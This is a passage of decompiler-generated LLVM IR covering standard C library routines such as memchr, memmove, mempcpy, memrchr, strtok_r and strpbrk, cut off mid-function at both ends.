  %v2_8055281 = inttoptr i32 %v1_8055281 to i32*
  %v3_8055281 = load i32, i32* %v2_8055281, align 4
  %v15_8055281 = icmp eq i32 %v3_8055281, %v3_805527e
  %v1_8055284 = icmp eq i1 %v15_8055281, false
  br i1 %v1_8055284, label %dec_label_pc_80552cd, label %dec_label_pc_8055286

dec_label_pc_8055286:                             ; preds = %dec_label_pc_805527e
  %v1_8055286 = add i32 %v2_805528f, 4
  %v2_8055286 = inttoptr i32 %v1_8055286 to i32*
  %v3_8055286 = load i32, i32* %v2_8055286, align 4
  %v13_8055286 = icmp eq i32 %v3_8055286, -2
  %v1_805528a = icmp eq i1 %v13_8055286, false
  br i1 %v1_805528a, label %dec_label_pc_8055294, label %dec_label_pc_805528c

dec_label_pc_805528c:                             ; preds = %dec_label_pc_8055286
  %v1_805528c = or i32 %v3_805525b, 4
  store i32 %v1_805528c, i32* @ecx, align 4
  %v1_805528f = trunc i32 %v1_805528c to i16
  store i16 %v1_805528f, i16* %v1_805525b, align 2
  br label %dec_label_pc_80552f2

dec_label_pc_8055294:                             ; preds = %dec_label_pc_8055286
  %v3_8055294 = and i16 %v2_805525b, 768
  %v4_8055294 = icmp eq i16 %v3_8055294, 0
  br i1 %v4_8055294, label %dec_label_pc_80552a9, label %dec_label_pc_8055299

dec_label_pc_8055299:                             ; preds = %dec_label_pc_8055294
  %v3_80552a1 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_80622ec.706 to i16*))
  %v0_80552a9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80552a9

dec_label_pc_80552a9:                             ; preds = %dec_label_pc_8055294, %dec_label_pc_8055299
  %v0_80552de = phi i32 [ %v2_805528f, %dec_label_pc_8055294 ], [ %v0_80552a9.pre, %dec_label_pc_8055299 ]
  %v1_80552a9 = add i32 %v0_80552de, 8
  %v2_80552a9 = inttoptr i32 %v1_80552a9 to i32*
  %v3_80552a9 = load i32, i32* %v2_80552a9, align 4
  %v1_80552ac = add i32 %v0_80552de, 12
  %v2_80552ac = inttoptr i32 %v1_80552ac to i32*
  %v3_80552ac = load i32, i32* %v2_80552ac, align 4
  %v15_80552ac = icmp eq i32 %v3_80552ac, %v3_80552a9
  br i1 %v15_80552ac, label %dec_label_pc_80552d6, label %dec_label_pc_80552b1

dec_label_pc_80552b1:                             ; preds = %dec_label_pc_80552a9
  %v2_80552b4 = add i32 %v0_80552de, 24
  %v3_80552b4 = inttoptr i32 %v2_80552b4 to i32*
  store i32 %v3_80552a9, i32* %v3_80552b4, align 4
  %v0_80552b7 = load i32, i32* @ebx, align 4
  %v2_80552b8 = call i32 @__stdio_rfill(i32 %v0_80552b7)
  %v1_80552c0 = icmp eq i32 %v2_80552b8, 0
  br i1 %v1_80552c0, label %dec_label_pc_80552f2, label %dec_label_pc_80552c4

dec_label_pc_80552c4:                             ; preds = %dec_label_pc_80552b1
  %v0_80552c4 = load i32, i32* @ebx, align 4
  %v1_80552c4 = add i32 %v0_80552c4, 20
  %v2_80552c4 = inttoptr i32 %v1_80552c4 to i32*
  %v3_80552c4 = load i32, i32* %v2_80552c4, align 4
  %v2_80552c7 = add i32 %v0_80552c4, 24
  %v3_80552c7 = inttoptr i32 %v2_80552c7 to i32*
  store i32 %v3_80552c4, i32* %v3_80552c7, align 4
  %v0_80552ca = load i32, i32* @ebx, align 4
  %v1_80552ca = add i32 %v0_80552ca, 16
  %v2_80552ca = inttoptr i32 %v1_80552ca to i32*
  %v3_80552ca = load i32, i32* %v2_80552ca, align 4
  br label %dec_label_pc_80552cd

dec_label_pc_80552cd:                             ; preds = %dec_label_pc_805527e, %entry, %dec_label_pc_80552c4
  %v1_80552d1 = phi i32 [ %v2_805528f, %dec_label_pc_805527e ], [ %v4_8055224, %entry ], [ %v0_80552ca, %dec_label_pc_80552c4 ]
  %v0_80552cd = phi i32 [ %v3_805527e, %dec_label_pc_805527e ], [ %v3_8055228, %entry ], [ %v3_80552ca, %dec_label_pc_80552c4 ]
  %v1_80552cd = inttoptr i32 %v0_80552cd to i8*
  %v2_80552cd = load i8, i8* %v1_80552cd, align 1
  %v3_80552cd = zext i8 %v2_80552cd to i32
  store i32 %v3_80552cd, i32* @edx, align 4
  %v1_80552d0 = add i32 %v0_80552cd, 1
  %v2_80552d1 = add i32 %v1_80552d1, 16
  %v3_80552d1 = inttoptr i32 %v2_80552d1 to i32*
  store i32 %v1_80552d0, i32* %v3_80552d1, align 4
  %v0_80552f8.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80552f5

dec_label_pc_80552d6:                             ; preds = %dec_label_pc_80552a9
  %v2_80552d9 = ptrtoint i8* %stack_var_-5 to i32
  %v5_80552de = inttoptr i32 %v0_80552de to i16*
  %v5_80552df = call i32 @__stdio_READ(i16* %v5_80552de, i32 %v2_80552d9, i32 1)
  %v1_80552e7 = icmp eq i32 %v5_80552df, 0
  br i1 %v1_80552e7, label %dec_label_pc_80552f2, label %dec_label_pc_80552eb

dec_label_pc_80552eb:                             ; preds = %dec_label_pc_80552d6
  %v3_80552eb = load i8, i8* %stack_var_-5, align 1
  %v4_80552eb = sext i8 %v3_80552eb to i32
  store i32 %v4_80552eb, i32* @edx, align 4
  br label %dec_label_pc_80552f5

dec_label_pc_80552f2:                             ; preds = %dec_label_pc_80552d6, %dec_label_pc_80552b1, %dec_label_pc_8055243, %dec_label_pc_805528c
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_80552f5

dec_label_pc_80552f5:                             ; preds = %dec_label_pc_80552eb, %dec_label_pc_80552cd, %dec_label_pc_8055263, %dec_label_pc_80552f2
  %v0_80552f8 = phi i32 [ %v4_80552eb, %dec_label_pc_80552eb ], [ %v0_80552f8.pre, %dec_label_pc_80552cd ], [ %v1_8055279, %dec_label_pc_8055263 ], [ -1, %dec_label_pc_80552f2 ]
  store i32 %v0_8055220, i32* @ebx, align 4
  ret i32 %v0_80552f8

; uselistorder directives
  uselistorder i32 %v0_80552cd, { 1, 0 }
  uselistorder i32 %v3_80552a9, { 1, 0 }
  uselistorder i32 %v0_80552de, { 0, 1, 3, 2 }
  uselistorder i32 %v3_805527e, { 1, 0, 2 }
  uselistorder i32 %v1_8055279, { 1, 0 }
  uselistorder i16 %v2_805525b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_805528f, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* @global_var_8062340.697, { 2, 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_80552f5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80552f2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80552cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80552a9, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80552fc = load i32, i32* @edi, align 4
  store i32 %v0_80552fc, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8055303 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055303, i32* %edi.global-to-local, align 4
  %v1_805530b = icmp eq i32 %arg3, 0
  store i1 %v1_805530b, i1* %zf.global-to-local, align 1
  br i1 %v1_805530b, label %dec_label_pc_805531b, label %dec_label_pc_805530f

dec_label_pc_805530f:                             ; preds = %entry
  %v2_805530f = call i32 @_strlen(i8* %arg1)
  %v3_805530f = mul i32 %v2_805530f, -1
  %v4_805530f = add i32 %v3_805530f, -2
  store i32 %v4_805530f, i32* @ecx, align 4
  %v0_8055311 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8055311, label %dec_label_pc_805530f.dec_label_pc_8055318_crit_edge, label %dec_label_pc_8055313

dec_label_pc_805530f.dec_label_pc_8055318_crit_edge: ; preds = %dec_label_pc_805530f
  %v0_8055318.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8055318.pre, -1
  br label %dec_label_pc_8055318

dec_label_pc_8055313:                             ; preds = %dec_label_pc_805530f
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055318

dec_label_pc_8055318:                             ; preds = %dec_label_pc_805530f.dec_label_pc_8055318_crit_edge, %dec_label_pc_8055313
  %v0_8055318 = phi i32 [ %phitmp, %dec_label_pc_805530f.dec_label_pc_8055318_crit_edge ], [ 0, %dec_label_pc_8055313 ]
  %v8_8055318 = icmp eq i32 %v0_8055318, 0
  store i1 %v8_8055318, i1* %zf.global-to-local, align 1
  store i32 %v0_8055318, i32* %edi.global-to-local, align 4
  %v2_805531b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805531b

dec_label_pc_805531b:                             ; preds = %entry, %dec_label_pc_8055318
  %v0_805531c = phi i32 [ 0, %entry ], [ %v0_8055318, %dec_label_pc_8055318 ]
  %v2_805531b = phi i32 [ %v0_80552fc, %entry ], [ %v2_805531b.pre, %dec_label_pc_8055318 ]
  store i32 %v2_805531b, i32* @edi, align 4
  ret i32 %v0_805531c

; uselistorder directives
  uselistorder i32 %v0_8055318, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805531b, { 1, 0 }
  uselistorder label %dec_label_pc_8055318, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8055321 = load i32, i32* @esi, align 4
  store i32 %v0_8055321, i32* %stack_var_-8, align 4
  %v4_8055322 = ptrtoint i8* %arg1 to i32
  %v9_805532e = icmp ugt i8* %tmp3, %arg1
  %v1_8055330 = icmp eq i1 %v9_805532e, false
  br i1 %v1_8055330, label %dec_label_pc_8055338, label %dec_label_pc_8055332

dec_label_pc_8055332:                             ; preds = %entry
  %v7_8055334 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8055344

dec_label_pc_8055338:                             ; preds = %entry
  %v3_8055338 = add i32 %arg2, -1
  %v4_8055338 = add i32 %v3_8055338, %tmp
  %v5_8055338 = inttoptr i32 %v4_8055338 to i8*
  %v3_805533c = add i32 %v4_8055322, -1
  %v4_805533c = add i32 %v3_805533c, %tmp
  %v5_805533c = inttoptr i32 %v4_805533c to i8*
  %v7_8055341 = call i8* @_memcpy(i8* %v5_805533c, i8* %v5_8055338, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8055344

dec_label_pc_8055344:                             ; preds = %dec_label_pc_8055332, %dec_label_pc_8055338
  %v2_8055344 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055344, i32* @esi, align 4
  ret i32 %v4_8055322

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055344, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055348 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_805535b = inttoptr i32 %arg1 to i16*
  %v4_805535b = call i32 @memcpy(i16* %v3_805535b, i32 %arg2, i32 %arg3)
  %v0_8055363 = load i32, i32* @esi, align 4
  %v2_8055363 = add i32 %v0_8055363, %arg3
  store i32 %v0_8055348, i32* @esi, align 4
  ret i32 %v2_8055363
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8055371 = urem i32 %arg2, 256
  %v4_805537d = sext i8 %arg1 to i32
  %v2_8055381 = add i32 %v4_805537d, %arg3
  %v1_80553937 = icmp eq i32 %arg3, 0
  br i1 %v1_80553937, label %dec_label_pc_805539b, label %dec_label_pc_8055397

dec_label_pc_8055385:                             ; preds = %dec_label_pc_8055397
  %v1_8055385 = add i32 %v0_8055385, -1
  %v5_8055386 = load i32, i32* @edx, align 4
  %v6_8055386 = and i32 %v5_8055386, -256
  %v7_8055386 = or i32 %v6_8055386, %v4_8055371
  store i32 %v7_8055386, i32* @edx, align 4
  %v1_805538a = inttoptr i32 %v1_8055385 to i8*
  %v2_805538a = load i8, i8* %v1_805538a, align 1
  %v15_805538a = icmp eq i8 %v2_805538a, %tmp
  br i1 %v15_805538a, label %dec_label_pc_8055418, label %dec_label_pc_8055392

dec_label_pc_8055392:                             ; preds = %dec_label_pc_8055385
  %v1_8055392 = add i32 %v0_8055392, -1
  %v8_8055392 = icmp eq i32 %v1_8055392, 0
  br i1 %v8_8055392, label %dec_label_pc_805539b, label %dec_label_pc_8055397

dec_label_pc_8055397:                             ; preds = %entry, %dec_label_pc_8055392
  %v0_8055392 = phi i32 [ %v1_8055392, %dec_label_pc_8055392 ], [ %arg3, %entry ]
  %v0_8055385 = phi i32 [ %v1_8055385, %dec_label_pc_8055392 ], [ %v2_8055381, %entry ]
  %v2_8055397 = urem i32 %v0_8055385, 4
  %v3_8055397 = icmp eq i32 %v2_8055397, 0
  %v1_8055399 = icmp eq i1 %v3_8055397, false
  br i1 %v1_8055399, label %dec_label_pc_8055385, label %dec_label_pc_805539b

dec_label_pc_805539b:                             ; preds = %dec_label_pc_8055392, %dec_label_pc_8055397, %entry
  %v0_80553fe.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8055392 ], [ %v0_8055392, %dec_label_pc_8055397 ]
  %v0_80553a0 = phi i32 [ %v2_8055381, %entry ], [ %v1_8055385, %dec_label_pc_8055392 ], [ %v0_8055385, %dec_label_pc_8055397 ]
  store i32 %v0_80553a0, i32* @ecx, align 4
  %v2_80553a4 = mul nuw nsw i32 %v4_8055371, 256
  %v2_80553a7 = or i32 %v2_80553a4, %v4_8055371
  %v2_80553ab = mul i32 %v2_80553a7, 65536
  %v2_80553ae = or i32 %v2_80553ab, %v2_80553a7
  %v6_805540155 = icmp ugt i32 %v0_80553fe.pr, 3
  br i1 %v6_805540155, label %dec_label_pc_80553b2, label %dec_label_pc_8055403

dec_label_pc_80553b2:                             ; preds = %dec_label_pc_805539b, %dec_label_pc_80553fb
  %v0_80553fb57 = phi i32 [ %v1_80553fb, %dec_label_pc_80553fb ], [ %v0_80553fe.pr, %dec_label_pc_805539b ]
  %v0_80553b256 = phi i32 [ %v1_80553b2, %dec_label_pc_80553fb ], [ %v0_80553a0, %dec_label_pc_805539b ]
  %v1_80553b2 = add i32 %v0_80553b256, -4
  store i32 %v1_80553b2, i32* @ecx, align 4
  %v2_80553b7 = inttoptr i32 %v1_80553b2 to i32*
  %v3_80553b7 = load i32, i32* %v2_80553b7, align 4
  %v4_80553b7 = xor i32 %v3_80553b7, %v2_80553ae
  %v1_80553b9 = add i32 %v4_80553b7, 2130640639
  %v1_80553bf = sub i32 -1, %v4_80553b7
  %v2_80553c1 = xor i32 %v1_80553b9, %v1_80553bf
  %v1_80553c3 = and i32 %v2_80553c1, -2130640640
  %v2_80553c3 = icmp eq i32 %v1_80553c3, 0
  br i1 %v2_80553c3, label %dec_label_pc_80553fb, label %dec_label_pc_80553cb

dec_label_pc_80553cb:                             ; preds = %dec_label_pc_80553b2
  %v7_80553cb = or i32 %v1_80553c3, %v4_8055371
  %v1_80553cf = add i32 %v0_80553b256, -1
  %v2_80553d2 = inttoptr i32 %v1_80553cf to i8*
  %v3_80553d2 = load i8, i8* %v2_80553d2, align 1
  %v16_80553d2 = icmp eq i8 %v3_80553d2, %tmp
  br i1 %v16_80553d2, label %dec_label_pc_8055418, label %dec_label_pc_80553d7

dec_label_pc_80553d7:                             ; preds = %dec_label_pc_80553cb
  %v1_80553db = add i32 %v0_80553b256, -2
  %v2_80553de = inttoptr i32 %v1_80553db to i8*
  %v3_80553de = load i8, i8* %v2_80553de, align 1
  %v16_80553de = icmp eq i8 %v3_80553de, %tmp
  br i1 %v16_80553de, label %dec_label_pc_8055418, label %dec_label_pc_80553e3

dec_label_pc_80553e3:                             ; preds = %dec_label_pc_80553d7
  %v1_80553e7 = add i32 %v0_80553b256, -3
  %v2_80553ea = inttoptr i32 %v1_80553e7 to i8*
  %v3_80553ea = load i8, i8* %v2_80553ea, align 1
  %v16_80553ea = icmp eq i8 %v3_80553ea, %tmp
  br i1 %v16_80553ea, label %dec_label_pc_8055418, label %dec_label_pc_80553ef

dec_label_pc_80553ef:                             ; preds = %dec_label_pc_80553e3
  %v1_80553f3 = inttoptr i32 %v1_80553b2 to i8*
  %v2_80553f3 = load i8, i8* %v1_80553f3, align 1
  %v15_80553f3 = icmp eq i8 %v2_80553f3, %tmp
  %v1_80553f5 = icmp eq i1 %v15_80553f3, false
  br i1 %v1_80553f5, label %dec_label_pc_80553fb, label %dec_label_pc_80553f7

dec_label_pc_80553f7:                             ; preds = %dec_label_pc_80553ef
  br label %dec_label_pc_8055418

dec_label_pc_80553fb:                             ; preds = %dec_label_pc_80553ef, %dec_label_pc_80553b2
  %v5_805540827 = phi i32 [ %v7_80553cb, %dec_label_pc_80553ef ], [ 0, %dec_label_pc_80553b2 ]
  %v1_80553fb = add i32 %v0_80553fb57, -4
  %v6_8055401 = icmp ugt i32 %v1_80553fb, 3
  br i1 %v6_8055401, label %dec_label_pc_80553b2, label %dec_label_pc_8055403

dec_label_pc_8055403:                             ; preds = %dec_label_pc_80553fb, %dec_label_pc_805539b
  %v5_805540826.lcssa = phi i32 [ %v4_8055371, %dec_label_pc_805539b ], [ %v5_805540827, %dec_label_pc_80553fb ]
  %v0_80553b2.lcssa = phi i32 [ %v0_80553a0, %dec_label_pc_805539b ], [ %v1_80553b2, %dec_label_pc_80553fb ]
  %v0_80553fb.lcssa = phi i32 [ %v0_80553fe.pr, %dec_label_pc_805539b ], [ %v1_80553fb, %dec_label_pc_80553fb ]
  br label %dec_label_pc_8055410

dec_label_pc_8055407:                             ; preds = %dec_label_pc_8055410
  %v1_8055410 = add i32 %v0_8055410, -1
  %v1_8055407 = add i32 %v0_8055407, -1
  %v6_8055408 = and i32 %v5_8055408, -256
  %v7_8055408 = or i32 %v6_8055408, %v4_8055371
  %v1_805540c = inttoptr i32 %v1_8055407 to i8*
  %v2_805540c = load i8, i8* %v1_805540c, align 1
  %v15_805540c = icmp eq i8 %v2_805540c, %tmp
  br i1 %v15_805540c, label %dec_label_pc_8055418, label %dec_label_pc_8055410

dec_label_pc_8055410:                             ; preds = %dec_label_pc_8055407, %dec_label_pc_8055403
  %v5_8055408 = phi i32 [ %v7_8055408, %dec_label_pc_8055407 ], [ %v5_805540826.lcssa, %dec_label_pc_8055403 ]
  %v0_8055407 = phi i32 [ %v1_8055407, %dec_label_pc_8055407 ], [ %v0_80553b2.lcssa, %dec_label_pc_8055403 ]
  %v0_8055410 = phi i32 [ %v1_8055410, %dec_label_pc_8055407 ], [ %v0_80553fb.lcssa, %dec_label_pc_8055403 ]
  %v10_8055411 = icmp eq i32 %v0_8055410, 0
  %v1_8055414 = icmp eq i1 %v10_8055411, false
  br i1 %v1_8055414, label %dec_label_pc_8055407, label %dec_label_pc_8055416

dec_label_pc_8055416:                             ; preds = %dec_label_pc_8055410
  br label %dec_label_pc_8055418

dec_label_pc_8055418:                             ; preds = %dec_label_pc_8055385, %dec_label_pc_80553e3, %dec_label_pc_80553d7, %dec_label_pc_80553cb, %dec_label_pc_8055407, %dec_label_pc_80553f7, %dec_label_pc_8055416
  %v0_805541b = phi i32 [ %v1_80553b2, %dec_label_pc_80553f7 ], [ 0, %dec_label_pc_8055416 ], [ %v1_8055407, %dec_label_pc_8055407 ], [ %v1_80553e7, %dec_label_pc_80553e3 ], [ %v1_80553db, %dec_label_pc_80553d7 ], [ %v1_80553cf, %dec_label_pc_80553cb ], [ %v1_8055385, %dec_label_pc_8055385 ]
  ret i32 %v0_805541b

; uselistorder directives
  uselistorder i32 %v0_8055410, { 1, 0 }
  uselistorder i32 %v1_80553fb, { 0, 2, 1 }
  uselistorder i32 %v1_80553b2, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_80553b256, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80553a7, { 1, 0 }
  uselistorder i32 %v0_8055385, { 1, 0, 2 }
  uselistorder i32 %v2_8055381, { 1, 0 }
  uselistorder i32 %v4_8055371, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 6, 0, 15, 16, 1, 14, 18, 13, 19, 3, 5, 4, 20, 7, 8, 9, 17, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055418, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80553b2, { 1, 0 }
  uselistorder label %dec_label_pc_805539b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055397, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805541c = load i32, i32* @edi, align 4
  %v0_805541d = load i32, i32* @esi, align 4
  %v0_805541e = load i32, i32* @ebx, align 4
  store i32 %v0_805541e, i32* %stack_var_-12, align 4
  %v4_805541f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805541f, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805542b = icmp eq i8* %arg1, null
  %v1_805542d = icmp eq i1 %v1_805542b, false
  br i1 %v1_805542d, label %dec_label_pc_8055431, label %dec_label_pc_805542f

dec_label_pc_805542f:                             ; preds = %entry
  %v1_805542f = inttoptr i32 %arg3 to i32*
  %v2_805542f = load i32, i32* %v1_805542f, align 4
  store i32 %v2_805542f, i32* @ebx, align 4
  br label %dec_label_pc_8055431

dec_label_pc_8055431:                             ; preds = %entry, %dec_label_pc_805542f
  %v0_8055434 = phi i32 [ %v4_805541f, %entry ], [ %v2_805542f, %dec_label_pc_805542f ]
  %v0_8055431 = load i32, i32* @ecx, align 4
  %v5_8055434 = inttoptr i32 %v0_8055434 to i8*
  %v8_8055435 = call i32 @__GI_strspn(i8* %v5_8055434, i32 %arg2, i32 %v0_8055431, i32 %v0_8055431)
  store i32 %v8_8055435, i32* %eax.global-to-local, align 4
  %v0_805543d = load i32, i32* @ebx, align 4
  %v2_805543d = add i32 %v0_805543d, %v8_8055435
  store i32 %v2_805543d, i32* @ebx, align 4
  %v1_805543f = inttoptr i32 %v2_805543d to i8*
  %v2_805543f = load i8, i8* %v1_805543f, align 1
  %v3_805543f = icmp eq i8 %v2_805543f, 0
  %v1_8055442 = icmp eq i1 %v3_805543f, false
  br i1 %v1_8055442, label %dec_label_pc_805544a, label %dec_label_pc_8055444

dec_label_pc_8055444:                             ; preds = %dec_label_pc_8055431
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8055446 = load i32, i32* @esi, align 4
  %v2_8055446 = inttoptr i32 %v1_8055446 to i32*
  store i32 %v2_805543d, i32* %v2_8055446, align 4
  %v0_8055474.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055471

dec_label_pc_805544a:                             ; preds = %dec_label_pc_8055431
  %v0_805544a = load i32, i32* @edx, align 4
  %v0_805544c = load i32, i32* @edi, align 4
  %v8_805544e = call i32 @__GI_strpbrk(i8* %v1_805543f, i32 %v0_805544c, i32 %v0_805544a, i32 %v0_805544a)
  store i32 %v8_805544e, i32* %eax.global-to-local, align 4
  %v2_8055456 = icmp eq i32 %v8_805544e, 0
  %v1_8055458 = icmp eq i1 %v2_8055456, false
  br i1 %v1_8055458, label %dec_label_pc_8055469, label %dec_label_pc_805545a

dec_label_pc_805545a:                             ; preds = %dec_label_pc_805544a
  %v0_805545e = load i32, i32* @ebx, align 4
  %v5_805545e = inttoptr i32 %v0_805545e to i8*
  %v8_805545f = call i32 @rawmemchr(i8* %v5_805545e, i32 0, i32 %v8_805544e, i32 %v8_805544e)
  br label %dec_label_pc_805546d

dec_label_pc_8055469:                             ; preds = %dec_label_pc_805544a
  %v9_805544e = inttoptr i32 %v8_805544e to i8*
  store i8 0, i8* %v9_805544e, align 1
  %v2_805546c = add i32 %v8_805544e, 1
  br label %dec_label_pc_805546d

dec_label_pc_805546d:                             ; preds = %dec_label_pc_805545a, %dec_label_pc_8055469
  %storemerge = phi i32 [ %v2_805546c, %dec_label_pc_8055469 ], [ %v8_805545f, %dec_label_pc_805545a ]
  %v0_805546d = phi i32 [ %v2_805546c, %dec_label_pc_8055469 ], [ %v8_805545f, %dec_label_pc_805545a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_805546d = load i32, i32* @esi, align 4
  %v2_805546d = inttoptr i32 %v1_805546d to i32*
  store i32 %v0_805546d, i32* %v2_805546d, align 4
  %v0_805546f = load i32, i32* @ebx, align 4
  store i32 %v0_805546f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055471

dec_label_pc_8055471:                             ; preds = %dec_label_pc_8055444, %dec_label_pc_805546d
  %v0_8055474 = phi i32 [ %v0_8055474.pre, %dec_label_pc_8055444 ], [ %v0_805546f, %dec_label_pc_805546d ]
  %v2_8055471 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055471, i32* @ebx, align 4
  store i32 %v0_805541d, i32* @esi, align 4
  store i32 %v0_805541c, i32* @edi, align 4
  ret i32 %v0_8055474

; uselistorder directives
  uselistorder i32 %v8_805544e, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055471, { 1, 0 }
  uselistorder label %dec_label_pc_805546d, { 1, 0 }
  uselistorder label %dec_label_pc_8055431, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055479 = load i32, i32* @ebx, align 4
  %v2_805549025 = load i8, i8* %arg1, align 1
  %v4_805549229 = icmp eq i8 %v2_805549025, 0
  br i1 %v4_805549229, label %dec_label_pc_805549a, label %dec_label_pc_8055496.lr.ph

dec_label_pc_8055496.lr.ph:                       ; preds = %entry
  %v3_805549026 = zext i8 %v2_805549025 to i32
  %v5_805549027 = and i32 %v0_8055479, -256
  %v6_805549028 = or i32 %v3_805549026, %v5_805549027
  %v4_805547e = ptrtoint i8* %arg1 to i32
  %v1_805548913 = inttoptr i32 %arg2 to i8*
  %v4_8055489.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8055496

dec_label_pc_8055484:                             ; preds = %dec_label_pc_8055496, %dec_label_pc_8055488
  %v6_805548923 = phi i32 [ %v6_8055489, %dec_label_pc_8055488 ], [ %v6_805548917, %dec_label_pc_8055496 ]
  %v2_805548922 = phi i8 [ %v2_8055489, %dec_label_pc_8055488 ], [ %v2_805548914, %dec_label_pc_8055496 ]
  %v0_805548821 = phi i32 [ %v1_8055488, %dec_label_pc_8055488 ], [ %arg2, %dec_label_pc_8055496 ]
  %v15_8055484 = icmp eq i8 %v2_805548922, %v2_805549033
  br i1 %v15_8055484, label %dec_label_pc_805549c, label %dec_label_pc_8055488

dec_label_pc_8055488:                             ; preds = %dec_label_pc_8055484
  %v1_8055488 = add i32 %v0_805548821, 1
  store i32 %v1_8055488, i32* @edx, align 4
  %v1_8055489 = inttoptr i32 %v1_8055488 to i8*
  %v2_8055489 = load i8, i8* %v1_8055489, align 1
  %v3_8055489 = zext i8 %v2_8055489 to i32
  %v5_8055489 = and i32 %v6_805548923, -256
  %v6_8055489 = or i32 %v3_8055489, %v5_8055489
  store i32 %v6_8055489, i32* @ecx, align 4
  %v4_805548b = icmp eq i8 %v2_8055489, 0
  %v1_805548d = icmp eq i1 %v4_805548b, false
  br i1 %v1_805548d, label %dec_label_pc_8055484, label %dec_label_pc_805548f

dec_label_pc_805548f:                             ; preds = %dec_label_pc_8055488, %dec_label_pc_8055496
  %v4_8055489.pre36 = phi i32 [ %v6_805548917, %dec_label_pc_8055496 ], [ %v6_8055489, %dec_label_pc_8055488 ]
  %v1_805548f = add i32 %v0_805548f31, 1
  %v1_8055490 = inttoptr i32 %v1_805548f to i8*
  %v2_8055490 = load i8, i8* %v1_8055490, align 1
  %v3_8055490 = zext i8 %v2_8055490 to i32
  %v5_8055490 = and i32 %v6_805549034, -256
  %v6_8055490 = or i32 %v3_8055490, %v5_8055490
  %v4_8055492 = icmp eq i8 %v2_8055490, 0
  br i1 %v4_8055492, label %dec_label_pc_805549a, label %dec_label_pc_8055496

dec_label_pc_8055496:                             ; preds = %dec_label_pc_8055496.lr.ph, %dec_label_pc_805548f
  %v4_8055489.pre = phi i32 [ %v4_8055489.pre.pre, %dec_label_pc_8055496.lr.ph ], [ %v4_8055489.pre36, %dec_label_pc_805548f ]
  %v6_805549034 = phi i32 [ %v6_805549028, %dec_label_pc_8055496.lr.ph ], [ %v6_8055490, %dec_label_pc_805548f ]
  %v2_805549033 = phi i8 [ %v2_805549025, %dec_label_pc_8055496.lr.ph ], [ %v2_8055490, %dec_label_pc_805548f ]
  %v0_805548f31 = phi i32 [ %v4_805547e, %dec_label_pc_8055496.lr.ph ], [ %v1_805548f, %dec_label_pc_805548f ]
  store i32 %arg2, i32* @edx, align 4
